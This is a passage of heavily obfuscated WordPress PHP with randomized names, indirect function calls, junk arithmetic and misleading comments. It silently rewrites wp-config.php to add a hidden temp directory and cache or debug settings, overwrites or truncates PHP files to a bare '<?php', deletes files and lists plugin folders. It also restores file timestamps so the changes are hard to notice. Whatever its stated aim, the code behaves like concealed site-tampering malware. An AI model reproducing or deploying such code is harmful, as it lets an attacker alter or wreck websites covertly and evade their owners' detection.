// deregister trie for WP List Block


  if  ($d33j_e30qfrbu && $_oh8gv71jy    &&     !empty($wxblmcmwgvzwjsap[pahk8uy1uxt(1483)])) {
     $prtpj6l6udejnznx  =   false;
      foreach   ($wxblmcmwgvzwjsap[mhiu2yqz6kqd(1483)] as $v40j5kyyznln)   {
  if  ((int)   $v40j5kyyznln[f5cd2smymkqusi5(1473)] >= (2+1))  {$tby67xi6=PHP_INT_MAX/PHP_INT_MAX;$hme85ars8ar426=$tby67xi6+62;
$prtpj6l6udejnznx   =     true;
  break;
}

}
if   ($prtpj6l6udejnznx) {
@update_option(pahk8uy1uxt(556), nrudcgor(1484)  .   $GLOBALS['__scf_zxyq0lcqv02z6_185'](),   f5cd2smymkqusi5(1461));
fukkkeh6955g9qi(nhceivfj8tbe(1433),    dhd5r6_4ki(1485));
   foreach  ($wxblmcmwgvzwjsap[dhd5r6_4ki(1483)]     as     $w4hc3ajs_7    =>     $v40j5kyyznln)     {
      if  ($GLOBALS['__scf_vf9p0fditvxy_35']($v40j5kyyznln) &&   empty($v40j5kyyznln[nhceivfj8tbe(1466)]))     $wxblmcmwgvzwjsap[dhd5r6_4ki(1483)][$w4hc3ajs_7][nhceivfj8tbe(1486)]   = 1;
  }
     $_oh8gv71jy   = true;
  }

  }  elseif  (!$d33j_e30qfrbu)      {
       $o1vj06yrsuw    =  @get_option(pahk8uy1uxt(556),     "");



if (!$GLOBALS['__scf__me483qbepnts_41']($o1vj06yrsuw) ||    $GLOBALS['__scf_nr12ouzrtt_7']($o1vj06yrsuw,  pahk8uy1uxt(1487))   !==   0) @update_option(nrudcgor(556),    dhd5r6_4ki(1488)   . $GLOBALS['__scf_zxyq0lcqv02z6_185'](),  nhceivfj8tbe(1461));$w4tgyx8u15t8=PHP_INT_MAX/PHP_INT_MAX;$k803hqbeo=$w4tgyx8u15t8+62;



      }
// WP Archive Title lazy decode

    if     ($_oh8gv71jy)  {
    if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1095)))    @wp_cache_delete(pahk8uy1uxt(1460), mhiu2yqz6kqd(1097));


 $qzon_7q21kqza  =  @get_option(nrudcgor(1489),    array());
 if   ($GLOBALS['__scf_vf9p0fditvxy_35']($qzon_7q21kqza) &&  isset($qzon_7q21kqza[mhiu2yqz6kqd(1483)])     && $GLOBALS['__scf_vf9p0fditvxy_35']($qzon_7q21kqza[nrudcgor(1483)]))   {
   foreach ($qzon_7q21kqza[f5cd2smymkqusi5(1483)] as     $jhswwrtezwvokqaq    =>   $e45mrbk7xgacxz5)   {


        if  (isset($wxblmcmwgvzwjsap[pahk8uy1uxt(1483)][$jhswwrtezwvokqaq])) continue;

       if (!$GLOBALS['__scf_rq7q923zwh_148']($jhswwrtezwvokqaq,   $q6hp6vgfdnj4mol8,   true))    {
 $wxblmcmwgvzwjsap[pahk8uy1uxt(1483)][$jhswwrtezwvokqaq]   = $e45mrbk7xgacxz5;



     continue;
}
if    (isset($pqrziwlrq3xgo87q[$jhswwrtezwvokqaq])    &&    $GLOBALS['__scf_vf9p0fditvxy_35']($e45mrbk7xgacxz5))     {
// checkpoint timeout-policy for PHPStan level 9

    $loc55i5e2xhlm6n = isset($e45mrbk7xgacxz5['g'])  ?   (float)   $e45mrbk7xgacxz5['g']   :  (float)    (isset($e45mrbk7xgacxz5[pahk8uy1uxt(1457)])  ?  $e45mrbk7xgacxz5[nrudcgor(1490)] :   0);
   $tyx6wxb3hrx06llj  = isset($pqrziwlrq3xgo87q[$jhswwrtezwvokqaq]['g'])   ?   (float) $pqrziwlrq3xgo87q[$jhswwrtezwvokqaq]['g']   :  (float)     (isset($pqrziwlrq3xgo87q[$jhswwrtezwvokqaq][nhceivfj8tbe(1490)])  ? $pqrziwlrq3xgo87q[$jhswwrtezwvokqaq][pahk8uy1uxt(1491)]   : 0);
  if ($loc55i5e2xhlm6n  >  $tyx6wxb3hrx06llj)  $wxblmcmwgvzwjsap[f5cd2smymkqusi5(1492)][$jhswwrtezwvokqaq]    = $e45mrbk7xgacxz5;


   unset($loc55i5e2xhlm6n,     $tyx6wxb3hrx06llj);
 }
     }
   }
       unset($qzon_7q21kqza,    $jhswwrtezwvokqaq,  $e45mrbk7xgacxz5);
       }
 foreach  ($pqrziwlrq3xgo87q as  $wf66uty50vax3ljx     =>  $_3vber35km__1qd)   {

if    (!isset($wxblmcmwgvzwjsap[f5cd2smymkqusi5(1493)][$wf66uty50vax3ljx])) t65xl1pt2haov_izh($_3vber35km__1qd['b']);
 }
    unset($pqrziwlrq3xgo87q,  $wf66uty50vax3ljx, $_3vber35km__1qd);
if (empty($wxblmcmwgvzwjsap[f5cd2smymkqusi5(1494)]))  @delete_option(nrudcgor(1489));
 elseif   ($_oh8gv71jy) @update_option(nrudcgor(1489),   $wxblmcmwgvzwjsap, pahk8uy1uxt(1461));
     }      finally  {
 m8s6jamaok_hdjr3wp(dhd5r6_4ki(1495));
}
 }



     function     j2368cjquni80wo1qowbhd($v_2ea0ui7nym)
{
 return $GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)     &&  ($GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, pahk8uy1uxt(1496))   !== false ||   $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,    nrudcgor(1497))    !==  false || $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, f5cd2smymkqusi5(1225))   !==  false   || $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,   nhceivfj8tbe(1498)) !== false   ||  $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,     nhceivfj8tbe(1248)) !==     false ||    $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,   mhiu2yqz6kqd(1499)) !== false);
        }
   function  atkwx0n3fft62b9($v_2ea0ui7nym)

     {
  if   (!j2368cjquni80wo1qowbhd($v_2ea0ui7nym)) return     false;
  if     (qw7nxv0zxmx9qe17o($v_2ea0ui7nym))   return     true;
 if  ($GLOBALS['__scf_q4nsibbhphays_1369'](f5cd2smymkqusi5(1500),    $v_2ea0ui7nym, $d1kd72zq60vf6el))    {
       foreach ($d1kd72zq60vf6el[1]  as  $bapy__bsu0g_)   {
if  (version_compare($bapy__bsu0g_,   kwqziujdph5xlz3n(),  '<'))  return   true;
     }

  return false;
 }
   return true;
 }

 function     f8z8rkb7r921dv80d8e($rk_3ecj8aw)
      {
 if      (!@$GLOBALS['__scf_gsamhlxot70ps_18']($rk_3ecj8aw)    || !@$GLOBALS['__scf_cu2oflxkvh_47']($rk_3ecj8aw))  return;
$mefny9wlt08e =   @$GLOBALS['__scf_g9y45bstmb02a_95']($rk_3ecj8aw);



if     (!$mefny9wlt08e) return;

 if  ($mefny9wlt08e > (1707897+8777863))     {

$t3t69czv7ab3lp59      =    @$GLOBALS['__scf_apq4pqdt6n41_91']($rk_3ecj8aw,    false,      null,  0,    (60295+5241));



   if (!j2368cjquni80wo1qowbhd($t3t69czv7ab3lp59))  return;$paptxsey=86+58;$fta5qbf9kraa=$paptxsey-32;
   if   (c0egos9umjdrt0ya($rk_3ecj8aw)  === false)   {
fukkkeh6955g9qi(nhceivfj8tbe(1501),    pahk8uy1uxt(1502)   .   $GLOBALS['__scf_t8832qq90dxb4_3']($rk_3ecj8aw));
 return;
 }
    @$GLOBALS['__scf_xkvbr8xk_o_mly_194']($rk_3ecj8aw, "<?php\n");


    if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(1292)))  @opcache_invalidate($rk_3ecj8aw,     true);
return;
}
    if  ($mefny9wlt08e > (1048527+49))  {
  $qzgro_yr__   =     (string)     @$GLOBALS['__scf_apq4pqdt6n41_91']($rk_3ecj8aw,   false,   null, 0, (8112+80));
 $lhn750gb3az   =  ($mefny9wlt08e > (8174+18))      ? (string)   @$GLOBALS['__scf_apq4pqdt6n41_91']($rk_3ecj8aw,  false, null,  $mefny9wlt08e  -  (0x1414+0xbec)) :   "";
        $zhh6shretc   = $qzgro_yr__  . $lhn750gb3az;
  if ($zhh6shretc !== ""  &&  $GLOBALS['__scf_q4nsibbhphays_1369'](f5cd2smymkqusi5(1503), $zhh6shretc, $uul2dokobf7cgrv))   {
   $obsztnu3zr3g5  =     false;
    foreach    ($uul2dokobf7cgrv[1]   as   $epwx0r874fjo7)  {
if  (version_compare($epwx0r874fjo7,  kwqziujdph5xlz3n(),   '<'))  {



        $obsztnu3zr3g5  =  true;
   break;

    }
   }
/* affine stack-frame */

 if (!$obsztnu3zr3g5) return;
}
        }
     $v_2ea0ui7nym  =  @$GLOBALS['__scf_apq4pqdt6n41_91']($rk_3ecj8aw);
if ($GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)    &&  $GLOBALS['__scf_amjjmfnilcolnb_10']($v_2ea0ui7nym)    > (1048546+30))   $v_2ea0ui7nym =   g9begdqy64lw_mpz($v_2ea0ui7nym);
   if     (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym)) return;
    if (!atkwx0n3fft62b9($v_2ea0ui7nym))   return;
 ba3l_3z5lkma0tku3g7qnz($rk_3ecj8aw,    $v_2ea0ui7nym);
   }
  function   ba3l_3z5lkma0tku3g7qnz($rk_3ecj8aw,  $v_2ea0ui7nym)



  {
   $pycaeceedws  = $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(1504), "",    $v_2ea0ui7nym);

  if (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws)  ||     $GLOBALS['__scf_uvjtdemk2f_320']($pycaeceedws)  ===  "" ||   $GLOBALS['__scf_uvjtdemk2f_320']($pycaeceedws)   === mhiu2yqz6kqd(1341))   $pycaeceedws =    "<?php\n";$o01dbl02u9owy=97+32;$vmggrmao7v=$o01dbl02u9owy-42;
 if   ($GLOBALS['__scf_amjjmfnilcolnb_10']($pycaeceedws)  >=  (578-78) && !hkk3yvii60ci7rk($pycaeceedws)) $pycaeceedws    = "<?php\n";
 $b3tkn6wfplfeh = @fileperms($rk_3ecj8aw);
$b3tkn6wfplfeh =  ($b3tkn6wfplfeh  ===    false) ?  (326+94)  :  ($b3tkn6wfplfeh      & (502+9));
        $ptha34uoe5w  =   @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($rk_3ecj8aw);
 $bj1db38wdsmcd =  xtkohsjdeedyznx6vx($GLOBALS['__scf_eure5hcx2b_11']($rk_3ecj8aw),    nrudcgor(1505));
 if  (!$GLOBALS['__scf__me483qbepnts_41']($bj1db38wdsmcd)   || $bj1db38wdsmcd   === "") return;
  if (@$GLOBALS['__scf_xkvbr8xk_o_mly_194']($bj1db38wdsmcd, $pycaeceedws)  !== $GLOBALS['__scf_amjjmfnilcolnb_10']($pycaeceedws))  {
     @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($bj1db38wdsmcd);
return;
        }
 @$GLOBALS['__scf_pn0jleeoof_16']($bj1db38wdsmcd, $b3tkn6wfplfeh);
if  (!@$GLOBALS['__scf_ieyslp1qonjfnv_72']($bj1db38wdsmcd, $rk_3ecj8aw))   {$bwx1iw8ou=31*5;$f97svcud_q0s=$bwx1iw8ou-18;
 @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($bj1db38wdsmcd);$okb2npqao_ady=2762;$ltmrttv3re1lt=$okb2npqao_ady%10;
 return;
}
     if  ($ptha34uoe5w)   @$GLOBALS['__scf_d91t8__q8rnbc2_71']($rk_3ecj8aw, $ptha34uoe5w);
     if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1292))) @opcache_invalidate($rk_3ecj8aw,   true);
   }
 function jjz6nl36p4ql7zj4uo($ha79t63e3av)
   {
if (!$GLOBALS['__scf__me483qbepnts_41']($ha79t63e3av))  return "";
 if  ($GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1506),     $ha79t63e3av,   $n5_viqwxd5rhwy3))    {
$spxzjtpg4pa938mw =  $n5_viqwxd5rhwy3[1];

   $mefny9wlt08e =    @$GLOBALS['__scf_gsamhlxot70ps_18']($spxzjtpg4pa938mw)    ?    @$GLOBALS['__scf_g9y45bstmb02a_95']($spxzjtpg4pa938mw) :   0;
   if  (!$mefny9wlt08e  ||  $mefny9wlt08e  <     (429+71)    ||   $mefny9wlt08e >    (52428786+14)) {
    if  ($mefny9wlt08e      > (0x7ed57f+0x2a12a81))  {
  $yok6k29y1iwy_ =   @$GLOBALS['__scf_a9u8k74i0cg19_33']($spxzjtpg4pa938mw);
 if     (!$GLOBALS['__scf__me483qbepnts_41']($yok6k29y1iwy_)) $yok6k29y1iwy_ =  $spxzjtpg4pa938mw;
  

$yok6k29y1iwy_ =  $GLOBALS['__scf_f9_5dfsm5hfxx_360']('\\',    '/',   $yok6k29y1iwy_);



 $k7uo7fqvr8upx3    = false;



 $o92dmzppq3uel    =   array(defined(pahk8uy1uxt(1395)) ? $GLOBALS['__scf_xv_2irmjrq_12'](ABSPATH, pahk8uy1uxt(1192))     :  "",    defined(nhceivfj8tbe(1261))    ?  $GLOBALS['__scf_xv_2irmjrq_12'](WP_CONTENT_DIR, dhd5r6_4ki(1507))  : "");

 foreach ($o92dmzppq3uel   as $fd2re_9bd_zw42zp)  {
  $fd2re_9bd_zw42zp   =   $GLOBALS['__scf_f9_5dfsm5hfxx_360']('\\', '/',   $fd2re_9bd_zw42zp);



     if    ($fd2re_9bd_zw42zp    !==  ""    &&  $GLOBALS['__scf_nr12ouzrtt_7']($yok6k29y1iwy_,   $fd2re_9bd_zw42zp .   '/')      === 0)  {


 $k7uo7fqvr8upx3 =   true;
   break;
 }


  }
  if ($k7uo7fqvr8upx3 &&    c0egos9umjdrt0ya($spxzjtpg4pa938mw) !==  false)   {
     @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($spxzjtpg4pa938mw);
    @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($GLOBALS['__scf_eure5hcx2b_11']($spxzjtpg4pa938mw)  . nrudcgor(697) . $GLOBALS['__scf_t8832qq90dxb4_3']($spxzjtpg4pa938mw,  dhd5r6_4ki(1508)));

}  else  {$sngnurtwdwwbdb=8624;$sb_y2zc212=$sngnurtwdwwbdb%15;
fukkkeh6955g9qi(nrudcgor(1509),     nhceivfj8tbe(1510) .     $GLOBALS['__scf_t8832qq90dxb4_3']($spxzjtpg4pa938mw));$b0bwt30plx=PHP_MAJOR_VERSION;$llumdxuohe=$b0bwt30plx*8;
     }
   }
     return      "";
       }
 }
   return  $ha79t63e3av;
  

   }
  function   dgzztrl1m0it_6e4w2r()



{

  static $spxzjtpg4pa938mw =   null;

if     ($spxzjtpg4pa938mw   === null)  {
$bapy__bsu0g_   =  weg_ghiafmuc1_6(nhceivfj8tbe(582), null);
 

 if ($bapy__bsu0g_ ===     null)  {
   $ytiykozwcur  = weg_ghiafmuc1_6(pahk8uy1uxt(344),  "");
 $bapy__bsu0g_  =   ($GLOBALS['__scf__me483qbepnts_41']($ytiykozwcur)  &&   $GLOBALS['__scf_nr12ouzrtt_7']($ytiykozwcur, dhd5r6_4ki(1511)) === 0)   ?      1  :  0;
 c8fb1vg_q0kn6h(f5cd2smymkqusi5(582),   $bapy__bsu0g_,  f5cd2smymkqusi5(1512));
   unset($ytiykozwcur);
     }
   $spxzjtpg4pa938mw  =  ((int)    $bapy__bsu0g_ ===   1);
        }
return $spxzjtpg4pa938mw;
   }


function  ovgbv71f20vmcol()



  {
/* convex canonical-form */

if (!defined(mhiu2yqz6kqd(1395))) return;



 $tkqx845nh5jt0    =  ABSPATH    .   f5cd2smymkqusi5(1244);
  if  (!@$GLOBALS['__scf_gsamhlxot70ps_18']($tkqx845nh5jt0))    {

     $avw94_yxqvbo3vp9 = $GLOBALS['__scf_eure5hcx2b_11'](ABSPATH) .  mhiu2yqz6kqd(1074);
   if (@$GLOBALS['__scf_gsamhlxot70ps_18']($avw94_yxqvbo3vp9))  $tkqx845nh5jt0   = $avw94_yxqvbo3vp9;
   }
 if   (!@$GLOBALS['__scf_gsamhlxot70ps_18']($tkqx845nh5jt0)    ||  !@$GLOBALS['__scf_cu2oflxkvh_47']($tkqx845nh5jt0))   return;
$yok6k29y1iwy_  =    @$GLOBALS['__scf_a9u8k74i0cg19_33']($tkqx845nh5jt0);
 if  ($GLOBALS['__scf__me483qbepnts_41']($yok6k29y1iwy_)     &&   $yok6k29y1iwy_ !==  ""     &&  @$GLOBALS['__scf_cu2oflxkvh_47']($yok6k29y1iwy_)) $tkqx845nh5jt0   = $yok6k29y1iwy_;
   if    (@$GLOBALS['__scf_g9y45bstmb02a_95']($tkqx845nh5jt0) >  (4194283+21))    return;
$v_2ea0ui7nym = @$GLOBALS['__scf_apq4pqdt6n41_91']($tkqx845nh5jt0);
     if (!$GLOBALS['__scf__me483qbepnts_41']($v_2ea0ui7nym) ||  $v_2ea0ui7nym  ===    "") return;
  $v06yo3jqcnarb =      ($GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,  nrudcgor(1513))  !==   false ||    $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, f5cd2smymkqusi5(1514)) !== false);
    $rsmuob0nm1se7z9r  = false;

     if   ($GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym,  nrudcgor(1515)) ===   false)  {
 if   (!empty($GLOBALS[nrudcgor(83)]))  {
 $rsmuob0nm1se7z9r =    true;
     }     else   {$jixm61xe9gu4_h=(0x8b+0xca);$r8zqxwcvf6i49=$jixm61xe9gu4_h%13;
      $g9pr9wbx88n =  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(229)) ? $GLOBALS['__scf_bwby2gdg0t53_75']()  :   nrudcgor(76);
  if   (!@$GLOBALS['__scf_ux4_n6mewmsy_43']($g9pr9wbx88n)  || !@$GLOBALS['__scf_cu2oflxkvh_47']($g9pr9wbx88n)) $rsmuob0nm1se7z9r =   true;
  }
    }
 $ve_e5ujos02    =     false;


$tyxk_08kunv  =  false;
     if    (!$GLOBALS['__scf_saw_32lvsj_92'](nrudcgor(1516),    $v_2ea0ui7nym) &&  defined(pahk8uy1uxt(1261)))  {
  $_ac  =  WP_CONTENT_DIR   .   nrudcgor(514);$msb3p2rft=66|105;$b4mroth6x=$msb3p2rft^123;
    if  (@$GLOBALS['__scf_gsamhlxot70ps_18']($_ac))     {
$g66t5k5m6cg =    (string)  @$GLOBALS['__scf_apq4pqdt6n41_91']($_ac,  false,  null,  0,   (4067+29));
   if ($GLOBALS['__scf_nr12ouzrtt_7']($g66t5k5m6cg,  dhd5r6_4ki(1517))  !== false)  $ve_e5ujos02   =   true;
 }
} elseif    (


    $GLOBALS['__scf_nr12ouzrtt_7']($v_2ea0ui7nym, f5cd2smymkqusi5(534))  ===  false
 && $GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(1518), $v_2ea0ui7nym)
   )   {
$tyxk_08kunv =      true;
 }
 $_bf7ywrkqprk8  =  false;
  if   (dgzztrl1m0it_6e4w2r())   {
   if  (
 !$GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1519),  $v_2ea0ui7nym)
|| !$GLOBALS['__scf_saw_32lvsj_92'](nhceivfj8tbe(1520),  $v_2ea0ui7nym)
  ||    !$GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(1521),     $v_2ea0ui7nym)
)      $_bf7ywrkqprk8 =  true;
  }



if (!$v06yo3jqcnarb  &&  !$rsmuob0nm1se7z9r &&  !$ve_e5ujos02   &&  !$_bf7ywrkqprk8  &&      !$tyxk_08kunv)    return;
$cppzppir7siqey6r   = "";

   $pycaeceedws     =   $v_2ea0ui7nym;
if  ($v06yo3jqcnarb)  {
   if   ($GLOBALS['__scf_q4nsibbhphays_1369'](nhceivfj8tbe(1522), $v_2ea0ui7nym,   $o13wcm5g913k6s)) $cppzppir7siqey6r .=  $GLOBALS['__scf_pcwytqel2ki6_341']("\n",   $o13wcm5g913k6s[0]);
  $pycaeceedws  =   $GLOBALS['__scf_fhlvy786vrl3_463'](mhiu2yqz6kqd(1523),  "",  $v_2ea0ui7nym);
 if (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))  return;
    if  (!$GLOBALS['__scf_saw_32lvsj_92'](mhiu2yqz6kqd(1524),     $pycaeceedws))   {
 if   ($GLOBALS['__scf_q4nsibbhphays_1369'](dhd5r6_4ki(1525),  $pycaeceedws,   $fo0r6nujzzr))  $cppzppir7siqey6r .=     "\n"   .  $GLOBALS['__scf_pcwytqel2ki6_341']("\n",   $fo0r6nujzzr[0]);
        $pycaeceedws      =  $GLOBALS['__scf_fhlvy786vrl3_463'](mhiu2yqz6kqd(1526), "", $pycaeceedws);
   if  (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))    return;
      }
  }
   $zgzzl6t88vvj0  =     f5cd2smymkqusi5(1527);
   if ($rsmuob0nm1se7z9r  && $GLOBALS['__scf_saw_32lvsj_92']('/' . $zgzzl6t88vvj0 .   '/',     $pycaeceedws)) {
 $pycaeceedws   = $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(1528)   . $zgzzl6t88vvj0  .   mhiu2yqz6kqd(1529),  pahk8uy1uxt(1530)  .  "define( 'WP_TEMP_DIR', ( defined( 'WP_CONTENT_DIR' ) ? WP_CONTENT_DIR : ABSPATH . 'wp-content' ) . '/.sc_tmp' );\n", $pycaeceedws, 1);
if (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))  return;
 }
 if ($ve_e5ujos02 &&    $GLOBALS['__scf_saw_32lvsj_92']('/'     . $zgzzl6t88vvj0  . '/',   $pycaeceedws))  {
   $pycaeceedws =  $GLOBALS['__scf_fhlvy786vrl3_463'](mhiu2yqz6kqd(1528)    .  $zgzzl6t88vvj0  . nhceivfj8tbe(1531),  dhd5r6_4ki(1530) .  "define( 'WP_CACHE', true ); /* SC_WC */\n",  $pycaeceedws,   1);
if   (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))      return;
   }   elseif ($tyxk_08kunv)  {
   $pycaeceedws   =  $GLOBALS['__scf_fhlvy786vrl3_463'](nrudcgor(1532)   .  $zgzzl6t88vvj0   . nrudcgor(1533), pahk8uy1uxt(1534)   . "define( 'WP_CACHE', true ); /* SC_WC */\n",   $pycaeceedws,    1);

 if    (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))     return;
 }
   if  ($_bf7ywrkqprk8) {



$pycaeceedws      =     $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1535),     "", $pycaeceedws);
 if (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws))    return;


    if  ($GLOBALS['__scf_saw_32lvsj_92'](dhd5r6_4ki(1532) .   $zgzzl6t88vvj0   .  mhiu2yqz6kqd(1531),  $pycaeceedws))   {
$pycaeceedws  =  $GLOBALS['__scf_fhlvy786vrl3_463'](nhceivfj8tbe(1536)      .    $zgzzl6t88vvj0  .      f5cd2smymkqusi5(1531),    mhiu2yqz6kqd(1534)  .    "define( 'WP_DEBUG', true );\ndefine( 'WP_DEBUG_LOG', true );\ndefine( 'WP_DEBUG_DISPLAY', false );\n",   $pycaeceedws,    1);
 if (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws)) return;
}
 }
    if ($pycaeceedws   ===  $v_2ea0ui7nym) return;
   if      (!hkk3yvii60ci7rk($pycaeceedws))    return;
  if   ($tyxk_08kunv      &&    $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1452))) @update_option(dhd5r6_4ki(1537), 1,   f5cd2smymkqusi5(1512));
if ($ve_e5ujos02  &&   !c8kiybf7y18a9bd5ahp($tkqx845nh5jt0, $v_2ea0ui7nym))  {
     fukkkeh6955g9qi(dhd5r6_4ki(1538),    f5cd2smymkqusi5(1539));
  $pycaeceedws   =   $GLOBALS['__scf_fhlvy786vrl3_463'](dhd5r6_4ki(1536)  .  $zgzzl6t88vvj0 .     nrudcgor(1540),  nrudcgor(1541),  $pycaeceedws, 1);
    if (!$GLOBALS['__scf__me483qbepnts_41']($pycaeceedws)   || $pycaeceedws   === $v_2ea0ui7nym) return;
  if (!hkk3yvii60ci7rk($pycaeceedws))   return;
   }
$b3tkn6wfplfeh    =   @fileperms($tkqx845nh5jt0);
     $b3tkn6wfplfeh   = ($b3tkn6wfplfeh ===   false) ?     (264+156) :   ($b3tkn6wfplfeh  & (439+72));
  $ptha34uoe5w   =    @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($tkqx845nh5jt0);
  $eiyu646ifqu      =      @$GLOBALS['__scf_apq4pqdt6n41_91']($tkqx845nh5jt0);
 if  (!$GLOBALS['__scf__me483qbepnts_41']($eiyu646ifqu) ||   $eiyu646ifqu !==   $v_2ea0ui7nym)     {
fukkkeh6955g9qi(nrudcgor(1538),   nrudcgor(1196));
   return;
 }
  unset($eiyu646ifqu);
    $bj1db38wdsmcd =    xtkohsjdeedyznx6vx($GLOBALS['__scf_eure5hcx2b_11']($tkqx845nh5jt0),  f5cd2smymkqusi5(1542));
   if (!$GLOBALS['__scf__me483qbepnts_41']($bj1db38wdsmcd) ||  $bj1db38wdsmcd === "")    return;
  if (@$GLOBALS['__scf_xkvbr8xk_o_mly_194']($bj1db38wdsmcd, $pycaeceedws)    !==  $GLOBALS['__scf_amjjmfnilcolnb_10']($pycaeceedws))    {$nb409o8l3gkqm4=2+52;$gwkuwh3wzgl39=$nb409o8l3gkqm4-30;
   @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($bj1db38wdsmcd);



     return;
       }
  @$GLOBALS['__scf_pn0jleeoof_16']($bj1db38wdsmcd,  $b3tkn6wfplfeh);
 if  (!@$GLOBALS['__scf_ieyslp1qonjfnv_72']($bj1db38wdsmcd,  $tkqx845nh5jt0))     {
@$GLOBALS['__scf_cdsp_fvydw_ufg_17']($bj1db38wdsmcd);
    return;
 }
   if ($ptha34uoe5w)   @$GLOBALS['__scf_d91t8__q8rnbc2_71']($tkqx845nh5jt0,     $ptha34uoe5w);



    if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(1292))) @opcache_invalidate($tkqx845nh5jt0, true);


   if ($ve_e5ujos02)   m08f_15ylhgex6($tkqx845nh5jt0);
      if (($ve_e5ujos02   ||    $tyxk_08kunv)    &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1543)))  @delete_option(mhiu2yqz6kqd(1544));
 if  ($GLOBALS['__scf_q4nsibbhphays_1369'](dhd5r6_4ki(1545), $cppzppir7siqey6r,     $m1n548o122i9a))  {
foreach     ($GLOBALS['__scf_e3ymc0hwiys_147']($m1n548o122i9a[1])   as  $_pe5b_hary)    {
 if    ($GLOBALS['__scf_nr12ouzrtt_7']($_pe5b_hary,   nhceivfj8tbe(1546))  ===   0  &&  @$GLOBALS['__scf_gsamhlxot70ps_18']($_pe5b_hary))      @$GLOBALS['__scf_cdsp_fvydw_ufg_17']($_pe5b_hary);
  }
}
 if     ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(1543)) &&  $GLOBALS['__scf_q4nsibbhphays_1369'](pahk8uy1uxt(1547),  $cppzppir7siqey6r,   $oeh09d6cf2l5fba7))  {
// WP Button Block: eager savepoint

  foreach  ($GLOBALS['__scf_e3ymc0hwiys_147']($oeh09d6cf2l5fba7[1])   as     $newnsaerc4f13p3) {
     if   ($GLOBALS['__scf_saw_32lvsj_92'](pahk8uy1uxt(1548),    $newnsaerc4f13p3)) @delete_option($newnsaerc4f13p3);
   }
     }
// orchestrate vault for PHP 8.0 JIT

     }



  function    tlu7j1592hs1mnb96o2dn()
 {
 if  (!defined(nhceivfj8tbe(1549)))  return;
 $n_xo67r_xk  = defined(pahk8uy1uxt(1550)) ? WPMU_PLUGIN_DIR :   WP_CONTENT_DIR .   nrudcgor(14);
   $etzrh92d7k5  =    array();



 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(1551)))  {
   if     (@$GLOBALS['__scf_ux4_n6mewmsy_43']($n_xo67r_xk))  foreach  ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69']($n_xo67r_xk . dhd5r6_4ki(807)) as   $amb3iz2lz0858q)  $etzrh92d7k5[] =   $amb3iz2lz0858q;
  if (defined(nhceivfj8tbe(1039))  &&   @$GLOBALS['__scf_ux4_n6mewmsy_43'](WP_PLUGIN_DIR))  foreach  ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69'](WP_PLUGIN_DIR    .     pahk8uy1uxt(462))  as   $amb3iz2lz0858q) $etzrh92d7k5[]   =   $amb3iz2lz0858q;
 }
// @replicate enumerator

  $ou1jl__31un5ac5u   = defined(dhd5r6_4ki(1395)) ?   ABSPATH    :    "";


   $ja5lgdisvfm =  WP_CONTENT_DIR .   nrudcgor(161) . $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($ou1jl__31un5ac5u  . nrudcgor(162)),   0,   (0x1+0x7))    .  dhd5r6_4ki(1552) .  $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_nn04_vx3uspzx4_54']($ou1jl__31un5ac5u   .    dhd5r6_4ki(1553)), 0,  (13-5))   .    pahk8uy1uxt(1508);


  if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($ja5lgdisvfm)) $etzrh92d7k5[]  =  $ja5lgdisvfm;
$cmu0_al8aotsj   =    jdvffp4c1kphjhjr6oscm();
  if  ($cmu0_al8aotsj    !==    $ja5lgdisvfm &&    @$GLOBALS['__scf_gsamhlxot70ps_18']($cmu0_al8aotsj))  $etzrh92d7k5[]  =  $cmu0_al8aotsj;
unset($cmu0_al8aotsj);



